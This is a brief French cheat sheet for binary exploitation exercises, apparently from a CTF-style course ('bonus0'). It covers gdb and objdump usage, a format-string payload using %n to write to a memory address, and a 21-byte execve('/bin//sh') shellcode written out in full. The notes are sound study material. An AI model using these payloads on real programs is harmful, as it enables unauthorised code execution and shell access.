cat exploit.txt
x/1x <address> = permet de voit ce qu'on ecrit dans l'addresse
x/32xw $esp = permet de check toute une zone de mémoire

objdump -R <executable> = permet de voir les function

python -c 'print "\x38\x98\x04\x08" + "%134514034x" + "%n"' > /var/crash/test.txt = permet d'écrire ton payload

cat <fichier> - | <executable> = permet de maintenir le terminal ouvert aprés l'exploit

gdb <Exec> = permet de lancer l'exec avec gdb

    dans gdb :
    b *<nom de la fonction>+<ligne> = permet de breakpoint
    run < <nom du fichier> = permet de send un fichier lors du run de l exec dans gdb

Dans le cas ou on veut envoyer le contenu d'un fichier en tant qu'argument de l'executable dans gdb on peut faire :

    Hors gdb :
        <nomdevariable>=$(</var/crash/test.txt)
        gdb --args <executable> $<nomdevariable>

dmesg = cool ça donne ou ça a crash




esp = premier arg
esp+4 = second
quand on break sur une instrction elle n'est pas encore call

r < <(cat /var/crash/first.txt; sleep .50; cat /var/crash/test2.txt)
permet d'envoyer plusieurs fichier sur plusieurs read/user entry dans gdb

r < $(python -c 'print "A"*40) AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
permet d'envoyer des arguments via GDB

(python -c ...; python -c ...; cat) | ./bonus0
permet d'envoyer plusieurs fichier sur plusieurs read/user entry dans bash

Le shell code (21 de taille) : "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

x/s *((char **)environ+1) --> permet de voir les var d'environnement (remplacer +1 ... +2, jusqu'a trouvé var voulu)
x/20s *((char **)environ) --> voir plein de var, augmenter 20 pour en voir plus
